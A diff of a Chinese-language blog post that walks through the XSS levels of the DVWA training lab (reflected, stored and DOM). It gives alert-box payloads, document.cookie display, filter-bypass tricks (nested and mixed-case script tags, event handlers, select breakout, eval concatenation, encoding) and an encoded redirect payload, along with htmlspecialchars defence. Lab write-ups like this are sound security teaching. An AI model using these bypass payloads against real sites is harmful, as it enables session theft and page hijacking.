@@ -227,7 +227,8 @@
             <h1 style="display: none">DVWA||XSS(Reflected&amp;Stored&amp;DOM)</h1>
             
             <div class="markdown-body">
-              <h1 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h1><p>XSS是跨站脚本攻击(Cross Site Scripting)恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS的实质其实是HTML代码与Javscript代码的注入。但由于XSS的攻击对象是与客户对等的Browser端，因此常常不被开发者所重视。但xss漏洞危害很大，一旦被攻击成功，私密网页，会话，cookie(许多网页在登录后服务端会返回一个cookie值给用户端，这样用户就不用多次输入密码进行登录，但cookie如果被窃取，攻击者就可以肆意登录用户的账号，<strong>http-only可确保cookie不被盗用</strong>)等内容都会被窃取，还可能导致流量被劫持实现恶意跳转（比如在网页中插入一段<code>&lt;script&gt;window.location.href=&quot;任意网址&quot;;&lt;/script&gt;</code>就可以跳转到别的网址）。</p>
+              <h1>XSS原理</h1>
+<p>XSS是跨站脚本攻击(Cross Site Scripting)恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS的实质其实是HTML代码与Javscript代码的注入。但由于XSS的攻击对象是与客户对等的Browser端，因此常常不被开发者所重视。但xss漏洞危害很大，一旦被攻击成功，私密网页，会话，cookie(许多网页在登录后服务端会返回一个cookie值给用户端，这样用户就不用多次输入密码进行登录，但cookie如果被窃取，攻击者就可以肆意登录用户的账号，<strong>http-only可确保cookie不被盗用</strong>)等内容都会被窃取，还可能导致流量被劫持实现恶意跳转（比如在网页中插入一段<code>&lt;script&gt;window.location.href=&quot;任意网址&quot;;&lt;/script&gt;</code>就可以跳转到别的网址）。</p>
 <p>举个栗子:</p>
 <p>随便写个网页</p>
 <pre><code class="hljs php-template"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span>
@@ -248,65 +249,64 @@
 <span class="php"><span class="hljs-meta">?&gt;</span></span>
 <span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span>
 <span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></code></pre>
-
 <p>效果：</p>
 <img src="/2021/01/27/3/2.jpg" srcset="/img/loading.gif" alt="2" style="zoom:67%;">
-
 <p>有点简陋(html了解不多)，随便输入一下页面会正常回显</p>
 <p><img src="/2021/01/27/3/3.jpg" srcset="/img/loading.gif" alt="3"></p>
 <p>查看页面源码</p>
 <p><img src="/2021/01/27/3/4.jpg" srcset="/img/loading.gif" alt="4"></p>
-<p>原封不动输入了，我们换个值输入:<code>&lt;script&gt;alert(&#39;genius&#39;)&lt;/script&gt;</code></p>
+<p>原封不动输入了，我们换个值输入:<code>&lt;script&gt;alert('genius')&lt;/script&gt;</code></p>
 <img src="/2021/01/27/3/5.jpg" srcset="/img/loading.gif" alt="5" style="zoom:67%;">
-
 <p>这次不像第一次那样，而是执行了输入的代码，弹出一个框，这就存在xss漏洞。但并不是只有script标签才可以插入代码，HTML中还有<code>onerror,oneclick,onmouseover,Onload……</code>多种方式，格式如下：</p>
 <pre><code class="hljs awk">onerror<span class="hljs-regexp">/oneclick/</span>onmouseover/Onload=“执行内容”</code></pre>
-
 <p>其次还可插在<code>&lt;img&gt;,&lt;textarea&gt;……</code>标签里。</p>
 <p>根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS，DOM型的XSS由于其特殊性，常常被分为第三种。</p>
-<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>反射型XSS又称非持久型XSS，这种攻击方式往往具有一次性。<br>攻击方式：攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。常出现于钓鱼网站，邮箱等。</p>
-<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>源码中有一个新函数：<code>array_key_exists() </code>:函数检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。</p>
+<h2 id="反射型XSS"><a class="header-anchor" href="#反射型XSS">🍭</a>反射型XSS</h2>
+<p>反射型XSS又称非持久型XSS，这种攻击方式往往具有一次性。<br>
+攻击方式：攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。常出现于钓鱼网站，邮箱等。</p>
+<h2 id="low"><a class="header-anchor" href="#low">🍭</a>low</h2>
+<p>源码中有一个新函数：<code>array_key_exists() </code>:函数检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。</p>
 <p>本关并无过滤。测试一下：</p>
 <p><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
 <img src="/2021/01/27/3/6.jpg" srcset="/img/loading.gif" alt="6" style="zoom: 80%;">
-
 <p>获取cookie:</p>
 <p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
 <p><img src="/2021/01/27/3/7.jpg" srcset="/img/loading.gif" alt="7"></p>
 <p>输入：</p>
 <img src="/2021/01/27/3/8.jpg" srcset="/img/loading.gif" alt="8" style="zoom:80%;">
-
 <p>就成功辽~</p>
-<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p>源码用<code>str_replace</code>函数对<code>&lt;script&gt;</code>标签进行替换。</p>
-<h3 id="嵌套绕过"><a href="#嵌套绕过" class="headerlink" title="嵌套绕过"></a>嵌套绕过</h3><p>构造：<code>&lt;scr&lt;script&gt;ipt&gt;alert(666)&lt;/script&gt;</code></p>
+<h2 id="medium"><a class="header-anchor" href="#medium">🍭</a>medium</h2>
+<p>源码用<code>str_replace</code>函数对<code>&lt;script&gt;</code>标签进行替换。</p>
+<h3 id="嵌套绕过"><a class="header-anchor" href="#嵌套绕过">🍭</a>嵌套绕过</h3>
+<p>构造：<code>&lt;scr&lt;script&gt;ipt&gt;alert(666)&lt;/script&gt;</code></p>
 <img src="/2021/01/27/3/10.jpg" srcset="/img/loading.gif" alt="10" style="zoom:50%;">
-
-<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p><code>&lt;Script&gt;alert(/genius/)&lt;/script&gt;</code></p>
+<h3 id="大小写绕过"><a class="header-anchor" href="#大小写绕过">🍭</a>大小写绕过</h3>
+<p><code>&lt;Script&gt;alert(/genius/)&lt;/script&gt;</code></p>
 <img src="/2021/01/27/3/11.jpg" srcset="/img/loading.gif" alt="11" style="zoom:80%;">
-
-<h3 id="使用别的标签来绕过"><a href="#使用别的标签来绕过" class="headerlink" title="使用别的标签来绕过"></a>使用别的标签来绕过</h3><p><code>&lt;body onload=alert(&#39;genius&#39;)&gt;</code></p>
-<p><code>&lt;a href=&#39;&#39; onclick=alert(&#39;genius&#39;)&gt;click&lt;/a&gt;</code></p>
-<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><pre><code class="hljs autoit">$name = preg_replace( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $_GET[ <span class="hljs-string">&#x27;name&#x27;</span> ] )<span class="hljs-comment">;</span></code></pre>
-
+<h3 id="使用别的标签来绕过"><a class="header-anchor" href="#使用别的标签来绕过">🍭</a>使用别的标签来绕过</h3>
+<p><code>&lt;body onload=alert('genius')&gt;</code></p>
+<p><code>&lt;a href='' onclick=alert('genius')&gt;click&lt;/a&gt;</code></p>
+<h2 id="high"><a class="header-anchor" href="#high">🍭</a>high</h2>
+<pre><code class="hljs autoit">$name = preg_replace( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $_GET[ <span class="hljs-string">&#x27;name&#x27;</span> ] )<span class="hljs-comment">;</span></code></pre>
 <p>本关用了正则表达式，对<code>&lt;script&gt;</code>标签进行了严格的过滤，但没有过滤别的标签，此时可以通过img、body等标签的事件或者iframe(在一个HTML中嵌入另一个HTML)等标签的src注入恶意的js代码.</p>
-<p><code>&lt;body onload=alert(&#39;jisso&#39;)&gt;</code></p>
-<p><code>&lt;img src=&quot;&quot; onerror=alert(&#39;lisa&#39;)&gt;</code></p>
-<p><code>&lt;a href=&#39;&#39; onclick=alert(&#39;rose&#39;)&gt;click&lt;/a&gt;</code></p>
+<p><code>&lt;body onload=alert('jisso')&gt;</code></p>
+<p><code>&lt;img src=&quot;&quot; onerror=alert('lisa')&gt;</code></p>
+<p><code>&lt;a href='' onclick=alert('rose')&gt;click&lt;/a&gt;</code></p>
 <p><code>Iframe:&lt;iframe onload=alert(gennie)&gt;</code></p>
-<p><code>&lt;body onmousemove=alert(&#39;genius&#39;)&gt;</code></p>
-<h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p><code>Anti-CSRF token</code>它又出来了</p>
+<p><code>&lt;body onmousemove=alert('genius')&gt;</code></p>
+<h2 id="impossible"><a class="header-anchor" href="#impossible">🍭</a>impossible</h2>
+<p><code>Anti-CSRF token</code>它又出来了</p>
 <p><code>htmlspecialchars()</code></p>
 <p>把预定义的字符转换为 HTML 实体。预定义字符：</p>
 <ul>
 <li>&amp; （和号）成为 &amp;</li>
-<li>“ （双引号）成为 “</li>
-<li>‘ （单引号）成为 ‘</li>
+<li>&quot; （双引号）成为 &quot;</li>
+<li>’ （单引号）成为 ’</li>
 <li>&lt; （小于）成为 &lt;</li>
 <li>&gt; （大于）成为 &gt;</li>
 </ul>
 <p>语法</p>
 <pre><code class="hljs applescript">htmlspecialchars(<span class="hljs-built_in">string</span>,flags,<span class="hljs-built_in">character</span>-<span class="hljs-keyword">set</span>,double_encode)</code></pre>
-
 <table>
 <thead>
 <tr>
@@ -314,7 +314,8 @@
 <th>描述</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td><em>string</em></td>
 <td>必需。规定要转换的字符串。</td>
 </tr>
@@ -330,106 +331,109 @@
 <td><em>double_encode</em></td>
 <td>可选。布尔值，规定了是否编码已存在的 HTML 实体。  TRUE - 默认。将对每个实体进行转换。 FALSE - 不会对已存在的 HTML 实体进行编码。</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p>详情：<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp">htmlspecialchars（）</a></p>
-<h1 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h1><p>存储型XSS又称持久型XSS，攻击脚本将被永久地存放在目标服务器的数据库或文件中，具有很高的隐蔽性。</p>
+<h1>存储型XSS</h1>
+<p>存储型XSS又称持久型XSS，攻击脚本将被永久地存放在目标服务器的数据库或文件中，具有很高的隐蔽性。</p>
 <p>攻击方式：这种攻击多见于论坛、博客和留言板，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。</p>
-<h2 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h2><p><img src="/2021/01/27/3/12.jpg" srcset="/img/loading.gif" alt="12"></p>
+<h2 id="low-v2"><a class="header-anchor" href="#low-v2">🍭</a>low</h2>
+<p><img src="/2021/01/27/3/12.jpg" srcset="/img/loading.gif" alt="12"></p>
 <p>本关只防御了SQL注入漏洞，并没有防御xss漏洞。</p>
-<p>测试一下：<code>&lt;script&gt;alert(&#39;lisa&#39;)&lt;/script&gt;</code></p>
+<p>测试一下：<code>&lt;script&gt;alert('lisa')&lt;/script&gt;</code></p>
 <p>发现name框里最多只能输入10个字符。有以下几种办法可以进行攻击：</p>
-<h3 id="message框编辑"><a href="#message框编辑" class="headerlink" title="message框编辑"></a>message框编辑</h3><p>name限制了但是message框没有字符限制，测试一下：</p>
+<h3 id="message框编辑"><a class="header-anchor" href="#message框编辑">🍭</a>message框编辑</h3>
+<p>name限制了但是message框没有字符限制，测试一下：</p>
 <img src="/2021/01/27/3/13.jpg" srcset="/img/loading.gif" alt="13" style="zoom:50%;">
-
 <p>message框可以攻击，这是一种思路；</p>
-<h3 id="在name框编辑，抓包篡改"><a href="#在name框编辑，抓包篡改" class="headerlink" title="在name框编辑，抓包篡改"></a>在name框编辑，抓包篡改</h3><p>抓包后在name框编辑即可。</p>
-<h3 id="在js前端修改参数"><a href="#在js前端修改参数" class="headerlink" title="在js前端修改参数"></a>在js前端修改参数</h3><img src="/2021/01/27/3/15.jpg" srcset="/img/loading.gif" alt="15" style="zoom:67%;">
-
+<h3 id="在name框编辑，抓包篡改"><a class="header-anchor" href="#在name框编辑，抓包篡改">🍭</a>在name框编辑，抓包篡改</h3>
+<p>抓包后在name框编辑即可。</p>
+<h3 id="在js前端修改参数"><a class="header-anchor" href="#在js前端修改参数">🍭</a>在js前端修改参数</h3>
+<img src="/2021/01/27/3/15.jpg" srcset="/img/loading.gif" alt="15" style="zoom:67%;">
 <p>将<code>maxlength</code>参数值改大即可。</p>
-<h3 id="借助火狐的插件Tamper-Data"><a href="#借助火狐的插件Tamper-Data" class="headerlink" title="借助火狐的插件Tamper Data"></a>借助火狐的插件Tamper Data</h3><img src="/2021/01/27/3/17.jpg" srcset="/img/loading.gif" alt="17" style="zoom:50%;">
-
+<h3 id="借助火狐的插件Tamper-Data"><a class="header-anchor" href="#借助火狐的插件Tamper-Data">🍭</a>借助火狐的插件Tamper Data</h3>
+<img src="/2021/01/27/3/17.jpg" srcset="/img/loading.gif" alt="17" style="zoom:50%;">
 <p>一样在message编写</p>
 <img src="/2021/01/27/3/16.jpg" srcset="/img/loading.gif" alt="16" style="zoom:50%;">
-
 <p>本与在message框编写无太大差异，但这个插件只要随意输入值，无需构造xss即可获取cookie值，且可篡改头文件等多个信息。</p>
-<h2 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h2><p><img src="/2021/01/27/3/18.jpg" srcset="/img/loading.gif" alt="18"></p>
+<h2 id="medium-v2"><a class="header-anchor" href="#medium-v2">🍭</a>medium</h2>
+<p><img src="/2021/01/27/3/18.jpg" srcset="/img/loading.gif" alt="18"></p>
 <p><code>addslashes() </code>函数返回在预定义字符之前添加反斜杠的字符串。</p>
 <p>预定义字符是：</p>
 <ul>
-<li>单引号（’）</li>
-<li>双引号（”）</li>
+<li>单引号（'）</li>
+<li>双引号（&quot;）</li>
 <li>反斜杠（\）</li>
 <li>NULL</li>
 </ul>
 <p>只对<code>&lt;script&gt;</code>替换，与反射型xss的medium一样,<code>&lt;script&gt;</code>的嵌套大小写绕过，标签绕过(如下)，依旧用修改js前端，或者抓包的方法</p>
-<p><code>&lt;body onload=alert(&#39;jisso&#39;)&gt;</code></p>
-<p><code>&lt;img src=&quot;&quot; onerror=alert(&#39;lisa&#39;)&gt;</code></p>
-<p><code>&lt;a href=&#39;&#39; onclick=alert(&#39;rose&#39;)&gt;click&lt;/a&gt;</code></p>
+<p><code>&lt;body onload=alert('jisso')&gt;</code></p>
+<p><code>&lt;img src=&quot;&quot; onerror=alert('lisa')&gt;</code></p>
+<p><code>&lt;a href='' onclick=alert('rose')&gt;click&lt;/a&gt;</code></p>
 <p><code>Iframe:&lt;iframe onload=alert(gennie)&gt;</code></p>
-<p><code>&lt;body onmousemove=alert(&#39;genius&#39;)&gt;</code></p>
-<h2 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h2><pre><code class="hljs stata"><span class="hljs-variable">$name</span> = preg_replace( &#x27;/&lt;(.*)<span class="hljs-built_in">s</span>(.*)c(.*)<span class="hljs-built_in">r</span>(.*)<span class="hljs-built_in">i</span>(.*)p(.*)t/i&#x27;, &#x27;&#x27;, <span class="hljs-variable">$name</span> );</code></pre>
-
+<p><code>&lt;body onmousemove=alert('genius')&gt;</code></p>
+<h2 id="high-v2"><a class="header-anchor" href="#high-v2">🍭</a>high</h2>
+<pre><code class="hljs stata"><span class="hljs-variable">$name</span> = preg_replace( &#x27;/&lt;(.*)<span class="hljs-built_in">s</span>(.*)c(.*)<span class="hljs-built_in">r</span>(.*)<span class="hljs-built_in">i</span>(.*)p(.*)t/i&#x27;, &#x27;&#x27;, <span class="hljs-variable">$name</span> );</code></pre>
 <p>与上一关类似，对<code>&lt;script&gt;</code>处理不同，本关用正则表达式处理，故方法与上一关相同，<code>&lt;script&gt;</code>的嵌套和大小写绕过不可用。</p>
-<h2 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h2><p><img src="/2021/01/27/3/19.jpg" srcset="/img/loading.gif" alt="19"></p>
-<h1 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h1><p>DOM全称Doument Object Model，使用DOM可以使程序和脚本能够动态访问和更新文档的内容、结构及样式。<br>DOM型XSS其实是一种特殊的反射型XSS，它是基于DOM文档对象模型的一种漏洞。HTML的标签都是节点，而这些节点组成了DOM的整体结构——节点树。通过HTML DOM,树中的所有节点均可通过JavaScript进行访问。所有HTML元素(节点)均可被修改，也可以创建或删除节点。HTMLDOM树结构如下</p>
+<h2 id="impossible-v2"><a class="header-anchor" href="#impossible-v2">🍭</a>impossible</h2>
+<p><img src="/2021/01/27/3/19.jpg" srcset="/img/loading.gif" alt="19"></p>
+<h1>DOM XSS</h1>
+<p>DOM全称Doument Object Model，使用DOM可以使程序和脚本能够动态访问和更新文档的内容、结构及样式。<br>
+DOM型XSS其实是一种特殊的反射型XSS，它是基于DOM文档对象模型的一种漏洞。HTML的标签都是节点，而这些节点组成了DOM的整体结构——节点树。通过HTML DOM,树中的所有节点均可通过JavaScript进行访问。所有HTML元素(节点)均可被修改，也可以创建或删除节点。HTMLDOM树结构如下</p>
 <p><img src="/2021/01/27/3/20.jpg" srcset="/img/loading.gif" alt="20"></p>
-<p>在网站页面中有许多元素，当页面到达浏览器时，浏览器会为页面创建一个顶级的Documentobject文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑，从而修改页面的元素。客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。<br>攻击方式：用户请求一个经过专门设计的URL，它由攻击者提交，且包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。</p>
-<h2 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h2><p>无任何处理，直接在url编写<code>&lt;script&gt;alert(&#39;lisa&#39;)&lt;/script&gt;</code></p>
+<p>在网站页面中有许多元素，当页面到达浏览器时，浏览器会为页面创建一个顶级的Documentobject文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑，从而修改页面的元素。客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。<br>
+攻击方式：用户请求一个经过专门设计的URL，它由攻击者提交，且包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。</p>
+<h2 id="low-v3"><a class="header-anchor" href="#low-v3">🍭</a>low</h2>
+<p>无任何处理，直接在url编写<code>&lt;script&gt;alert('lisa')&lt;/script&gt;</code></p>
 <img src="/2021/01/27/3/21.jpg" srcset="/img/loading.gif" alt="21" style="zoom:50%;">
-
-<h2 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h2><p><img src="/2021/01/27/3/22.jpg" srcset="/img/loading.gif" alt="22"></p>
-<p>相当于将<code>&lt;script&gt;</code>过滤掉，其它标签还是可以使用的<code>&lt;img  src=1  οnerrοr=(&#39;hack&#39;)&gt;</code>，并没有弹框</p>
+<h2 id="medium-v3"><a class="header-anchor" href="#medium-v3">🍭</a>medium</h2>
+<p><img src="/2021/01/27/3/22.jpg" srcset="/img/loading.gif" alt="22"></p>
+<p>相当于将<code>&lt;script&gt;</code>过滤掉，其它标签还是可以使用的<code>&lt;img  src=1  οnerrοr=('hack')&gt;</code>，并没有弹框</p>
 <img src="/2021/01/27/3/23.jpg" srcset="/img/loading.gif" alt="23" style="zoom:67%;">
-
-<p>确实插入了，但插入的代码并没有在<code>&lt;option&gt;</code>标签值中，故要构造<code>&gt;&lt;option&gt;&lt;img src=1 onerror=alert(&#39;hack&#39;)&gt;</code>来闭合，但依旧不能弹框，仔细观察发现前面还有一个<code>&lt;select&gt;</code>,故我们要构造一个独立语句打破<code>&lt;select&gt;</code>标签的限制：<code>&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&#39;hack&#39;)&gt;</code></p>
+<p>确实插入了，但插入的代码并没有在<code>&lt;option&gt;</code>标签值中，故要构造<code>&gt;&lt;option&gt;&lt;img src=1 onerror=alert('hack')&gt;</code>来闭合，但依旧不能弹框，仔细观察发现前面还有一个<code>&lt;select&gt;</code>,故我们要构造一个独立语句打破<code>&lt;select&gt;</code>标签的限制：<code>&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert('hack')&gt;</code></p>
 <img src="/2021/01/27/3/24.jpg" srcset="/img/loading.gif" alt="24" style="zoom:50%;">
-
 <p>成功~</p>
-<h2 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h2><p>白名单 ：只允许上传  French  English German  Spanish 中一个，因为URL中#号之后的内容不会被提交到服务器，故可以构造：<code>English#&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
-<h2 id="impossible-2"><a href="#impossible-2" class="headerlink" title="impossible"></a>impossible</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<h2 id="high-v3"><a class="header-anchor" href="#high-v3">🍭</a>high</h2>
+<p>白名单 ：只允许上传  French  English German  Spanish 中一个，因为URL中#号之后的内容不会被提交到服务器，故可以构造：<code>English#&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<h2 id="impossible-v3"><a class="header-anchor" href="#impossible-v3">🍭</a>impossible</h2>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-comment"># Don&#x27;t need to do anything, protction handled on the client side</span>
 <span class="hljs-meta">?&gt;</span></code></pre>
-
 <p>保护在客户端处理，先编写测试看看</p>
 <p><img src="/2021/01/27/3/26.jpg" srcset="/img/loading.gif" alt="26"></p>
 <p>发现输入的参数并没有进行URL解码</p>
 <p><img src="/2021/01/27/3/25.jpg" srcset="/img/loading.gif" alt="25"></p>
 <p>故XSS漏洞不存在.</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>单是刷dvwa并不能全面了解XSS，还有一些本次靶场没用到的标签：</p>
+<h1>总结</h1>
+<p>单是刷dvwa并不能全面了解XSS，还有一些本次靶场没用到的标签：</p>
 <p><code>&lt;input&gt;</code></p>
 <pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span>
 竞争焦点，从而触发onblur事件
 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onblur</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">xss</span>&quot;) <span class="hljs-attr">autofocus</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">autofocus</span>&gt;</span>
 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</code></pre>
-
 <p><code>&lt;details&gt;</code></p>
 <pre><code class="hljs routeros">&lt;details <span class="hljs-attribute">ontoggle</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;
 使用open属性触发ontoggle事件，无需用户去触发
 &lt;details open <span class="hljs-attribute">ontoggle</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</code></pre>
-
-<p> <code>&lt;svg&gt;</code></p>
+<p><code>&lt;svg&gt;</code></p>
 <pre><code class="hljs abnf">&lt;svg onload=alert(<span class="hljs-string">&quot;xss&quot;</span>)<span class="hljs-comment">;&gt;</span></code></pre>
-
-<p> <code>&lt;video&gt;</code></p>
+<p><code>&lt;video&gt;</code></p>
 <pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">video</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span></code></pre>
-
-<p> <code>&lt;audio&gt;</code></p>
+<p><code>&lt;audio&gt;</code></p>
 <pre><code class="hljs routeros">&lt;audio <span class="hljs-attribute">src</span>=x  <span class="hljs-attribute">onerror</span>=alert(&quot;xss&quot;);&gt;</code></pre>
-
 <p><code>&lt;textarea&gt;</code></p>
 <pre><code class="hljs abnf">&lt;textarea onfocus=alert(<span class="hljs-string">&quot;xss&quot;</span>)<span class="hljs-comment">; autofocus&gt;</span></code></pre>
-
 <p>还有绕过方法:</p>
-<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>用<code>/</code>代替空格</p>
+<h3 id="过滤空格"><a class="header-anchor" href="#过滤空格">🍭</a>过滤空格</h3>
+<p>用<code>/</code>代替空格</p>
 <pre><code class="hljs abnf">&lt;img/src=<span class="hljs-string">&quot;x&quot;</span>/onerror=alert(<span class="hljs-string">&quot;xss&quot;</span>)<span class="hljs-comment">;&gt;</span></code></pre>
-
-<h3 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h3><p>利用eval</p>
+<h3 id="字符拼接"><a class="header-anchor" href="#字符拼接">🍭</a>字符拼接</h3>
+<p>利用eval</p>
 <pre><code class="hljs autohotkey">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</code></pre>
-
 <p>利用top</p>
 <pre><code class="hljs markdown"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span>top[<span class="hljs-string">&quot;al&quot;+&quot;ert&quot;</span>](<span class="hljs-link">`xss`</span>);<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre>
-
-<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><ul>
+<h3 id="编码绕过"><a class="header-anchor" href="#编码绕过">🍭</a>编码绕过</h3>
+<ul>
 <li>Unicode编码绕过</li>
 <li>url编码绕过</li>
 <li>Ascii码绕过</li>
@@ -437,10 +441,13 @@
 <li>八进制</li>
 <li>base64绕过</li>
 </ul>
-<h3 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h3><p>当括号被过滤的时候可以使用throw来绕过</p>
-<h3 id="过滤url地址"><a href="#过滤url地址" class="headerlink" title="过滤url地址"></a>过滤url地址</h3><h4 id="使用url编码"><a href="#使用url编码" class="headerlink" title="使用url编码"></a>使用url编码</h4><pre><code class="hljs xquery">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror<span class="hljs-built_in">=document</span>.location=`http://<span class="hljs-meta">%77</span><span class="hljs-meta">%77</span><span class="hljs-meta">%77</span><span class="hljs-meta">%2e</span><span class="hljs-meta">%62</span><span class="hljs-meta">%61</span><span class="hljs-meta">%69</span><span class="hljs-meta">%64</span><span class="hljs-meta">%75</span><span class="hljs-meta">%2e</span><span class="hljs-meta">%63</span><span class="hljs-meta">%6f</span><span class="hljs-meta">%6d</span>/`&gt;</code></pre>
-
-<h4 id="使用IP"><a href="#使用IP" class="headerlink" title="使用IP"></a>使用IP</h4><ul>
+<h3 id="过滤括号"><a class="header-anchor" href="#过滤括号">🍭</a>过滤括号</h3>
+<p>当括号被过滤的时候可以使用throw来绕过</p>
+<h3 id="过滤url地址"><a class="header-anchor" href="#过滤url地址">🍭</a>过滤url地址</h3>
+<h4 id="使用url编码"><a class="header-anchor" href="#使用url编码">🍭</a>使用url编码</h4>
+<pre><code class="hljs xquery">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror<span class="hljs-built_in">=document</span>.location=`http://<span class="hljs-meta">%77</span><span class="hljs-meta">%77</span><span class="hljs-meta">%77</span><span class="hljs-meta">%2e</span><span class="hljs-meta">%62</span><span class="hljs-meta">%61</span><span class="hljs-meta">%69</span><span class="hljs-meta">%64</span><span class="hljs-meta">%75</span><span class="hljs-meta">%2e</span><span class="hljs-meta">%63</span><span class="hljs-meta">%6f</span><span class="hljs-meta">%6d</span>/`&gt;</code></pre>
+<h4 id="使用IP"><a class="header-anchor" href="#使用IP">🍭</a>使用IP</h4>
+<ul>
 <li>十进制IP</li>
 <li>八进制IP</li>
 <li>hex</li>
